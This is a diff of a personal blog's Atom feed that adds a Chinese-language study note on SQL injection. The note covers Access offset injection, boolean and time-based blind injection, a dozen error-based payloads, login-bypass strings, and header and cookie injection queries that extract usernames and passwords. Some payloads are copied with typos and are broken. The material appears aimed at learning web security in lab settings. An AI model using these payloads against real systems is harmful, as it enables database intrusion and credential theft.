@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://jinqipiaopiao.github.io/</id>
     <title>Gridea</title>
-    <updated>2021-10-06T03:17:20.282Z</updated>
+    <updated>2021-10-07T02:45:08.250Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://jinqipiaopiao.github.io/"/>
     <link rel="self" href="https://jinqipiaopiao.github.io/atom.xml"/>
@@ -950,7 +950,185 @@ http://github.com/youngyangyang04/NoSQLAttack
 
 https://github.com/sqlmapproject/sqlmap/zipball/master
 
-https://blog.csdn.net/qq_39936434/category_9103379.html</code></pre>
+https://blog.csdn.net/qq_39936434/category_9103379.html、
+</code></pre>
+<h1 id="2021-10-07">2021-10-07</h1>
+<p>WEB漏洞-SQL注入之查询方式及报错盲注<br>
+当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好地选择对应的注入语句。</p>
+<p>1<br>
+补充：Access暴力猜解不出的问题？</p>
+<p>Access偏移注入：解决列名获取不到的情况</p>
+<p>在已知表名不知列名的前提下（表名admin）</p>
+<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
+</code></pre>
+<p>将选取的内容替换为“*”（页面报错）</p>
+<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin
+</code></pre>
+<p>删减选取的内容直到页面正常</p>
+<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin
+
+?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin（页面正常）
+</code></pre>
+<p>所以<code>“*”</code>代替的字符串=22-16=6，说明admin里有6个列</p>
+<p><code>“*”</code>后面的内容长度看作和<code>“*”</code>一样，这里剪掉两个<code>“*”</code>的长度</p>
+<p>一级偏移语句：</p>
+<pre><code>?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)
+</code></pre>
+<p>查看源代码，会发现随机爆出的数据内容</p>
+<p>如果无效尝试二级偏移</p>
+<p>二级偏移语句：</p>
+<pre><code>?id=1513 UNION SELECT 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join as c on a.id=c.id)
+</code></pre>
+<p></p>
+<p>查看登录框源代码的表单值或观察URL特征等也可以针对表或列获取不到的情况</p>
+<p>有时猜解不到是因为表名有前缀，可以通过观察是否存在特定的前缀等来尝试</p>
+<p></p>
+<p>注入无回显的原因</p>
+<p>SQL语句查询方式导致的</p>
+<p>未使用显示代码或使用不当导致的</p>
+<p></p>
+<p>常见SQL语句</p>
+<p>select 查询数据</p>
+<p>在网站应用中进行数据显示查询操作</p>
+<pre><code>select * from news where id=$id
+</code></pre>
+<p></p>
+<p>insert 插入数据</p>
+<p>在网站应用中进行用户注册添加等操作</p>
+<pre><code>insert into news(id,url,text) values(2,'x','$t')
+</code></pre>
+<p></p>
+<p>delete 删除数据</p>
+<p>后台管理里面删除文章删除用户等操作</p>
+<pre><code>delete from news where id=$id
+</code></pre>
+<p></p>
+<p>update 更新数据</p>
+<p>会员或后台中心数据同步或缓存等操作</p>
+<pre><code>update user set pwd='$p' where id=2 and username='admin'
+</code></pre>
+<p></p>
+<p>order by 排列数据</p>
+<p>一般结合表名或列名进行数据排序操作</p>
+<pre><code>select * from news order by $id
+
+select id,name,price from news order by $order
+</code></pre>
+<p></p>
+<p>重点理解：</p>
+<p>我们可以通过以上查询方式与网站应用的关系去猜测注入点产生地方或应用和对方的SQL查询方式。</p>
+<p></p>
+<p>SQL注入报错盲注</p>
+<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
+<p></p>
+<p>基于布尔的SQL盲注-逻辑判断</p>
+<p>regexp，like，ascii，left，ord，mid</p>
+<pre><code>?id=1’ and left(database(),2)=’se’--+（正确则页面正常，错误则页面异常）
+</code></pre>
+<p></p>
+<p>基于时间的SQL盲注-延时判断</p>
+<pre><code>if，sleep
+
+?id=1 and sleep(if(database()=’pikachu’,5,0))--+
+
+?id=1 and sleep(if(length(database())=8,5,0))--+
+
+?id=1 and sleep(if(mid(database(),1,1)=’s’,5,0))--+
+
+?id=1 and sleep(if(ascii(mid(database(),1,1))=115,5,0))--+
+
+（用ASCII码可以避免引号转义，也方便写脚本）
+
+?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+
+</code></pre>
+<p></p>
+<p>基于报错的SQL盲注-报错回显</p>
+<pre><code>floor，updatexml，extractvalue
+</code></pre>
+<p>https://www.jianshu.com/p/bc35f8dd4f7c</p>
+<p>1、通过floor报错,注入语句如下:<br>
+and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</p>
+<p>2、通过ExtractValue报错,注入语句如下:<br>
+and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
+<p>3、通过UpdateXml报错,注入语句如下:<br>
+and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
+<p>4、通过NAME_CONST报错,注入语句如下:<br>
+and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
+<p>5、通过join报错,注入语句如下:<br>
+select * from(select * from mysql.user ajoin mysql.user b)c;</p>
+<p>6、通过exp报错,注入语句如下:<br>
+and exp(~(select * from (select user () ) a) );</p>
+<p>7、通过GeometryCollection()报错,注入语句如下:<br>
+and GeometryCollection(()select *from(select user () )a)b );</p>
+<p>8、通过polygon ()报错,注入语句如下:<br>
+and polygon (()select * from(select user ())a)b );</p>
+<p>9、通过multipoint ()报错,注入语句如下:<br>
+and multipoint (()select * from(select user() )a)b );</p>
+<p>10、通过multlinestring ()报错,注入语句如下:<br>
+and multlinestring (()select * from(selectuser () )a)b );</p>
+<p>11、通过multpolygon ()报错,注入语句如下:<br>
+and multpolygon (()select * from(selectuser () )a)b );</p>
+<p>12、通过linestring ()报错,注入语句如下:<br>
+and linestring (()select * from(select user() )a)b );</p>
+<p>关于POST注入<br>
+常用的万能username语句：</p>
+<pre><code>a ’ or 1=1 #
+a &quot;) or 1=1 #
+a‘) or 1=1 #
+a” or “1”=”1
+' or '1'='1
+' or (length(database())) = 8 (用于输入’ “都没有错误)
+' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
+&quot;) or (&quot;1&quot;)=(&quot;1
+&quot;) or 1=1 or if(1=1, sleep(1), null) #
+&quot;) or (length(database())) = 8 #
+&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #
+</code></pre>
+<p>post型盲注通杀payload：<br>
+uname=admin%df'or()or%200%23&amp;passwd=&amp;submit=Submit</p>
+<p>关于UPDATEXML,REFERER,COOKIE的构造<br>
+User-Agent:.........' or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #<br>
+Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #<br>
+Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</p>
+<p>updatexml报错注入<br>
+爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>
+链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)<br>
+链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>
+爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
+爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
+爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)<br>
+爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</p>
+<p>作者：L0ki<br>
+链接：https://www.jianshu.com/p/bc35f8dd4f7c<br>
+来源：简书<br>
+著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+<p>参考：</p>
+<pre><code>like ‘ro%’                        判断ro或ro...是否成立
+
+regexp ‘xiaodi[a-z]’        匹配xiaodi及xiaodi...等
+
+if(条件,5,0)                     条件成立则返回5，反之返回0
+
+sleep(5)                         SQL语句延时执行5秒
+
+mid(a,b,c)                      从位置b开始，截取a字符串的c位
+
+substr(a,b,c)                  从b位置开始，截取字符串a的c长度
+
+left(database(),1),database()    left(a,b)从左侧截取a的前b位
+
+length(database())=8    判断数据库database()名的长度
+
+ord=ascii ascii(x)=97     判断x的ascii码是否等于97
+</code></pre>
+<p></p>
+<p>其他</p>
+<p>如果需要在请求行注入，用“+”或“%20”代替空格</p>
+<p></p>
+<p>涉及资源：</p>
+<p>12种报错注入+万能语句：https://www.jianshu.com/p/bc35f8dd4f7c</p>
+<p>Order by排序注入方法小总结：https://www.jianshu.com/p/fcae21926e5c</p>
+<p>asp+access注入源码：https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g 提取码：l9f6 作者：shtome https://www.bilibili.com/read/cv12614611/ 出处：bilibili</p>
 ]]></content>
     </entry>
     <entry>
